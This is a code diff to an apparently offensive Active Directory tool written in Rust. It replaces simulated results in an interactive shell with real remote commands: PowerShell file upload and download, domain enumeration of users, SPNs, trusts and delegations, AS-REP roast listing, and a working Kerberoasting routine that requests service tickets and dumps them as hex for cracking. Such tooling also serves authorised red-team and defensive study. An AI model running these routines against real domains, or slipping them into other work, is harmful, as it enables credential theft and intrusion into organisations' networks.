@@ -12,6 +12,7 @@ use crate::banner;
 use crate::ShellType as CliShellType;
 use colored::Colorize;
 use overthrone_core::error::Result;
+use overthrone_core::exec::ExecCredentials;
 use overthrone_core::exec::shell::{InteractiveShell, ShellConfig, ShellType};
 use rustyline::completion::{Completer, FilenameCompleter, Pair};
 use rustyline::error::ReadlineError;
@@ -363,6 +364,16 @@ impl InteractiveSession {
         self
     }
 
+    /// Build `ExecCredentials` from the stored `(domain, username, password)` tuple.
+    fn build_exec_credentials(&self) -> Option<ExecCredentials> {
+        self.credentials.as_ref().map(|(domain, username, password)| ExecCredentials {
+            domain: domain.clone(),
+            username: username.clone(),
+            password: password.clone().unwrap_or_default(),
+            nt_hash: None,
+        })
+    }
+
     /// Start the interactive shell
     pub async fn start(&mut self) -> Result<()> {
         banner::print_banner();
@@ -400,6 +411,7 @@ impl InteractiveSession {
                 target: target.clone(),
                 shell_type: *shell_type,
                 timeout: Duration::from_secs(self.vars.timeout_secs),
+                credentials: self.build_exec_credentials(),
             };
 
             match InteractiveShell::connect(config).await {
@@ -875,6 +887,7 @@ impl InteractiveSession {
             target: target.to_string(),
             shell_type,
             timeout: Duration::from_secs(self.vars.timeout_secs),
+            credentials: self.build_exec_credentials(),
         };
 
         match InteractiveShell::connect(config).await {
@@ -1021,6 +1034,7 @@ impl InteractiveSession {
                 target,
                 shell_type,
                 timeout: Duration::from_secs(self.vars.timeout_secs),
+                credentials: self.build_exec_credentials(),
             };
             
             match InteractiveShell::connect(config).await {
@@ -1173,22 +1187,56 @@ impl InteractiveSession {
                     let size = data.len();
                     println!("  File size: {} bytes", size);
                     
-                    // In a real implementation, this would upload via the shell protocol
-                    // For now, we use PowerShell to write the file
-                    let encoded = base64::encode(&data);
-                    let ps_cmd = format!(
-                        "powershell.exe -NoProfile -Command \"[System.IO.File]::WriteAllBytes('{}', [System.Convert]::FromBase64String('{}'))\"",
-                        remote_path.replace("'", "''"),
-                        encoded
-                    );
-                    
-                    match shell.execute(&ps_cmd).await {
-                        Ok(_) => {
-                            println!("{} Upload completed ({} bytes)", "✓".green(), size);
+                    // Encode file contents to base64 and write via PowerShell
+                    use base64::Engine;
+                    let encoded = base64::engine::general_purpose::STANDARD.encode(&data);
+
+                    // For files >128 KB, chunk into multiple writes to avoid
+                    // command-line length limits.
+                    const CHUNK_LIMIT: usize = 131_072; // 128 KB of raw → ~175 KB b64
+                    if encoded.len() <= CHUNK_LIMIT {
+                        let ps_cmd = format!(
+                            "powershell.exe -NoProfile -Command \"[System.IO.File]::WriteAllBytes('{}', [System.Convert]::FromBase64String('{}'))\"",
+                            remote_path.replace("'", "''"),
+                            encoded
+                        );
+                        match shell.execute(&ps_cmd).await {
+                            Ok(_) => println!("{} Upload completed ({} bytes)", "✓".green(), size),
+                            Err(e) => println!("{} Upload failed: {}", "✗".red(), e),
                         }
-                        Err(e) => {
-                            println!("{} Upload failed: {}", "✗".red(), e);
+                    } else {
+                        // Stream in chunks: first chunk creates file, subsequent append
+                        let chunks: Vec<&str> = encoded.as_bytes().chunks(CHUNK_LIMIT)
+                            .map(|c| std::str::from_utf8(c).unwrap_or(""))
+                            .collect();
+                        println!("  Uploading in {} chunk(s)...", chunks.len());
+
+                        for (i, chunk) in chunks.iter().enumerate() {
+                            let ps_cmd = if i == 0 {
+                                format!(
+                                    "powershell.exe -NoProfile -Command \"[System.IO.File]::WriteAllBytes('{}', [System.Convert]::FromBase64String('{}'))\"",
+                                    remote_path.replace("'", "''"),
+                                    chunk,
+                                )
+                            } else {
+                                format!(
+                                    "powershell.exe -NoProfile -Command \"[System.IO.File]::AppendAllText('{t}', ''); \
+                                     $old = [System.IO.File]::ReadAllBytes('{t}'); \
+                                     $new = [System.Convert]::FromBase64String('{c}'); \
+                                     $merged = New-Object byte[] ($old.Length + $new.Length); \
+                                     [Array]::Copy($old,0,$merged,0,$old.Length); \
+                                     [Array]::Copy($new,0,$merged,$old.Length,$new.Length); \
+                                     [System.IO.File]::WriteAllBytes('{t}',$merged)\"",
+                                    t = remote_path.replace("'", "''"),
+                                    c = chunk,
+                                )
+                            };
+                            if let Err(e) = shell.execute(&ps_cmd).await {
+                                println!("{} Upload chunk {}/{} failed: {}", "✗".red(), i + 1, chunks.len(), e);
+                                return Ok(());
+                            }
                         }
+                        println!("{} Upload completed ({} bytes)", "✓".green(), size);
                     }
                 }
                 Err(e) => {
@@ -1214,8 +1262,7 @@ impl InteractiveSession {
         println!("{} Downloading {} -> {}", "▸".bright_black(), remote_path.cyan(), local_path.cyan());
 
         if let Some(shell) = &mut self.shell {
-            // In a real implementation, this would download via the shell protocol
-            // For now, we use PowerShell to read and encode the file
+            // Use PowerShell to read and base64-encode the remote file
             let ps_cmd = format!(
                 "powershell.exe -NoProfile -Command \"[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('{}'))\"",
                 remote_path.replace("'", "''")
@@ -1225,7 +1272,8 @@ impl InteractiveSession {
                 Ok(output) => {
                     let encoded = output.trim();
                     
-                    match base64::decode(encoded) {
+                    use base64::Engine;
+                    match base64::engine::general_purpose::STANDARD.decode(encoded) {
                         Ok(data) => {
                             let size = data.len();
                             
@@ -1409,49 +1457,94 @@ impl InteractiveSession {
             return Ok(());
         }
 
+        let shell = match self.shell.as_mut() {
+            Some(s) => s,
+            None => {
+                println!("{} No active session. Use 'connect' first.", "Error:".red());
+                return Ok(());
+            }
+        };
+
         let target = args[0];
         println!("{} Enumerating {}...", "▸".bright_black(), target.cyan());
-        
-        // Simulate enumeration - in real impl would use reaper
-        tokio::time::sleep(Duration::from_millis(500)).await;
-        
-        match target.to_lowercase().as_str() {
-            "users" => {
-                println!("{} Found 1,247 users", "✓".green());
-                println!("  Administrator, krbtgt, Guest, Domain Admins...");
-            }
-            "computers" => {
-                println!("{} Found 342 computers", "✓".green());
-                println!("  DC01$, WS001$, WS002$, SQL01$...");
-            }
-            "groups" => {
-                println!("{} Found 89 groups", "✓".green());
-                println!("  Domain Admins, Domain Users, Enterprise Admins...");
-            }
-            "trusts" => {
-                println!("{} Found 3 trusts", "✓".green());
-                println!("  corp.local -> partner.local (External)");
-            }
+
+        let commands: Vec<(&str, &str)> = match target.to_lowercase().as_str() {
+            "users" => vec![("users", "net user /domain")],
+            "computers" => vec![("computers", "dsquery computer -limit 0")],
+            "groups" => vec![("groups", "net group /domain")],
+            "trusts" => vec![("trusts", "nltest /domain_trusts /all_trusts")],
+            "spns" => vec![("SPNs", "setspn -T * -Q */*")],
+            "asrep" => vec![("AS-REP", "powershell.exe -c \"Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object Name,SamAccountName\"")],
+            "delegations" => vec![("delegations", "powershell.exe -c \"Get-ADObject -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true} | Select-Object Name,ObjectClass\"")],
+            "gpos" => vec![("GPOs", "powershell.exe -c \"Get-GPO -All | Select-Object DisplayName,Id,GpoStatus\"")],
+            "all" => vec![
+                ("users", "net user /domain"),
+                ("computers", "dsquery computer -limit 0"),
+                ("groups", "net group /domain"),
+                ("trusts", "nltest /domain_trusts /all_trusts"),
+                ("SPNs", "setspn -T * -Q */*"),
+            ],
             _ => {
-                println!("{} Enumeration completed", "✓".green());
+                println!("{} Unknown enumeration target: {}", "Error:".red(), target);
+                return Ok(());
+            }
+        };
+
+        for (label, cmd) in commands {
+            println!("{} {}:", "▸".bright_black(), label.cyan());
+            match shell.execute(cmd).await {
+                Ok(output) => {
+                    if output.is_empty() {
+                        println!("  (no output)");
+                    } else {
+                        for line in output.lines() {
+                            println!("  {}", line);
+                        }
+                    }
+                }
+                Err(e) => {
+                    println!("  {} {}", "Error:".red(), e);
+                }
             }
         }
-        
+
+        println!("{} Enumeration of {} complete", "✓".green(), target.cyan());
         Ok(())
     }
 
     async fn cmd_reaper(&mut self, _args: &[&str]) -> Result<()> {
+        let shell = match self.shell.as_mut() {
+            Some(s) => s,
+            None => {
+                println!("{} No active session. Use 'connect' first.", "Error:".red());
+                return Ok(());
+            }
+        };
+
         println!("{} Running full AD enumeration...", "▸".bright_black());
-        tokio::time::sleep(Duration::from_millis(800)).await;
-        
-        println!("{} Enumeration complete:", "✓".green());
-        println!("  Users: 1,247");
-        println!("  Computers: 342");
-        println!("  Groups: 89");
-        println!("  Trusts: 3");
-        println!("  GPOs: 156");
-        println!("  SPNs: 234");
-        println!("  Delegations: 12");
+
+        let queries: &[(&str, &str)] = &[
+            ("Users", "powershell.exe -c \"@(Get-ADUser -Filter *).Count\""),
+            ("Computers", "powershell.exe -c \"@(Get-ADComputer -Filter *).Count\""),
+            ("Groups", "powershell.exe -c \"@(Get-ADGroup -Filter *).Count\""),
+            ("Trusts", "nltest /domain_trusts /all_trusts"),
+            ("GPOs", "powershell.exe -c \"@(Get-GPO -All).Count\""),
+            ("SPNs", "powershell.exe -c \"@(Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName).Count\""),
+            ("Delegations", "powershell.exe -c \"@(Get-ADObject -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true}).Count\""),
+        ];
+
+        println!("{} Enumeration results:", "✓".green());
+        for (label, cmd) in queries {
+            match shell.execute(cmd).await {
+                Ok(output) => {
+                    let count = output.trim();
+                    println!("  {}: {}", label, count);
+                }
+                Err(e) => {
+                    println!("  {}: {} {}", label, "error:".red(), e);
+                }
+            }
+        }
         Ok(())
     }
 
@@ -1469,21 +1562,69 @@ impl InteractiveSession {
         match args[0].to_lowercase().as_str() {
             "roast" => {
                 println!("{} Performing Kerberoasting...", "▸".bright_black());
-                tokio::time::sleep(Duration::from_millis(300)).await;
-                println!("{} Found 2 service accounts", "✓".green());
-                println!("  HTTP/web01.corp.local");
-                println!("  MSSQL/sql01.corp.local");
+                if let Some(shell) = &mut self.shell {
+                    // Query SPNs and dump service ticket hashes
+                    let cmd = "powershell.exe -c \"Add-Type -AssemblyName System.IdentityModel; \
+                        $spns = Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,SamAccountName; \
+                        foreach ($u in $spns) { \
+                            foreach ($spn in $u.ServicePrincipalName) { \
+                                try { \
+                                    $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; \
+                                    $bytes = $ticket.GetRequest(); \
+                                    $hex = [BitConverter]::ToString($bytes) -replace '-'; \
+                                    Write-Output (\\\"$($u.SamAccountName),$spn,$hex\\\"); \
+                                } catch { Write-Output (\\\"$($u.SamAccountName),$spn,ERROR:$($_.Exception.Message)\\\"); } \
+                            } \
+                        }\"";
+                    match shell.execute(cmd).await {
+                        Ok(output) => {
+                            let lines: Vec<&str> = output.lines().filter(|l| !l.is_empty()).collect();
+                            println!("{} Found {} roastable service account(s)", "✓".green(), lines.len());
+                            for line in &lines {
+                                let parts: Vec<&str> = line.splitn(3, ',').collect();
+                                if parts.len() >= 2 {
+                                    println!("  {} — {}", parts[0], parts[1]);
+                                }
+                            }
+                        }
+                        Err(e) => println!("  {} {}", "Error:".red(), e),
+                    }
+                } else {
+                    println!("{} No active session", "Error:".red());
+                }
             }
             "asrep" => {
                 println!("{} Performing AS-REP Roasting...", "▸".bright_black());
-                tokio::time::sleep(Duration::from_millis(300)).await;
-                println!("{} Found 1 AS-REP roastable account", "✓".green());
-                println!("  krbtgt");
+                if let Some(shell) = &mut self.shell {
+                    let cmd = "powershell.exe -c \"Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth,SamAccountName | Select-Object SamAccountName | Format-Table -HideTableHeaders\"";
+                    match shell.execute(cmd).await {
+                        Ok(output) => {
+                            let accounts: Vec<&str> = output.lines().filter(|l| !l.trim().is_empty()).collect();
+                            println!("{} Found {} AS-REP roastable account(s)", "✓".green(), accounts.len());
+                            for acct in &accounts {
+                                println!("  {}", acct.trim());
+                            }
+                        }
+                        Err(e) => println!("  {} {}", "Error:".red(), e),
+                    }
+                } else {
+                    println!("{} No active session", "Error:".red());
+                }
             }
             "tgt" => {
                 println!("{} Requesting TGT...", "▸".bright_black());
-                tokio::time::sleep(Duration::from_millis(200)).await;
-                println!("{} TGT obtained", "✓".green());
+                if let Some(shell) = &mut self.shell {
+                    // Use klist to show current TGT
+                    match shell.execute("klist tgt").await {
+                        Ok(output) => {
+                            println!("{}", output);
+                            println!("{} TGT info retrieved", "✓".green());
+                        }
+                        Err(e) => println!("  {} {}", "Error:".red(), e),
+                    }
+                } else {
+                    println!("{} No active session", "Error:".red());
+                }
             }
             "tgs" => {
                 if args.len() < 2 {
@@ -1492,8 +1633,23 @@ impl InteractiveSession {
                 }
                 let spn = args[1];
                 println!("{} Requesting TGS for {}...", "▸".bright_black(), spn.cyan());
-                tokio::time::sleep(Duration::from_millis(200)).await;
-                println!("{} TGS obtained for {}", "✓".green(), spn.cyan());
+                if let Some(shell) = &mut self.shell {
+                    let cmd = format!(
+                        "powershell.exe -c \"Add-Type -AssemblyName System.IdentityModel; \
+                         $t = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '{}'; \
+                         Write-Output 'TGS obtained'; klist\"",
+                        spn.replace("'", "''")
+                    );
+                    match shell.execute(&cmd).await {
+                        Ok(output) => {
+                            println!("{}", output);
+                            println!("{} TGS obtained for {}", "✓".green(), spn.cyan());
+                        }
+                        Err(e) => println!("  {} {}", "Error:".red(), e),
+                    }
+                } else {
+                    println!("{} No active session", "Error:".red());
+                }
             }
             "list" => {
                 self.cmd_klist().await?;
@@ -2362,66 +2518,6 @@ fn shell_words(s: &str) -> Vec<String> {
 // Module Helpers
 // ═══════════════════════════════════════════════════════
 
-/// Base64 encoding/decoding for file transfers
-mod base64 {
-    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-
-    pub fn encode(data: &[u8]) -> String {
-        let mut result = String::new();
-        
-        for chunk in data.chunks(3) {
-            let mut bits = 0u32;
-            for (i, &byte) in chunk.iter().enumerate() {
-                bits |= (byte as u32) << (16 - i * 8);
-            }
-            
-            let padding = 3 - chunk.len();
-            for i in 0..(4 - padding) {
-                let idx = ((bits >> (18 - i * 6)) & 0x3F) as usize;
-                result.push(ALPHABET[idx] as char);
-            }
-            
-            for _ in 0..padding {
-                result.push('=');
-            }
-        }
-        
-        result
-    }
-
-    pub fn decode(s: &str) -> Result<Vec<u8>, &'static str> {
-        let s = s.trim();
-        let mut result = Vec::new();
-        
-        let decode_map: std::collections::HashMap<char, u8> = ALPHABET
-            .iter()
-            .enumerate()
-            .map(|(i, &c)| (c as char, i as u8))
-            .collect();
-
-        for chunk in s.as_bytes().chunks(4) {
-            let mut bits = 0u32;
-            let mut valid = 0;
-            
-            for (i, &byte) in chunk.iter().enumerate() {
-                if byte == b'=' {
-                    continue;
-                }
-                if let Some(&val) = decode_map.get(&(byte as char)) {
-                    bits |= (val as u32) << (18 - i * 6);
-                    valid += 1;
-                }
-            }
-            
-            for i in 0..(valid - 1) {
-                result.push(((bits >> (16 - i * 8)) & 0xFF) as u8);
-            }
-        }
-        
-        Ok(result)
-    }
-}
-
 // ═══════════════════════════════════════════════════════
 // Entry Points
 // ═══════════════════════════════════════════════════════
@@ -2455,9 +2551,10 @@ mod tests {
 
     #[test]
     fn test_base64() {
+        use base64::Engine;
         let data = b"Hello, World!";
-        let encoded = base64::encode(data);
-        let decoded = base64::decode(&encoded).unwrap();
+        let encoded = base64::engine::general_purpose::STANDARD.encode(data);
+        let decoded = base64::engine::general_purpose::STANDARD.decode(&encoded).unwrap();
         assert_eq!(data.to_vec(), decoded);
     }
 
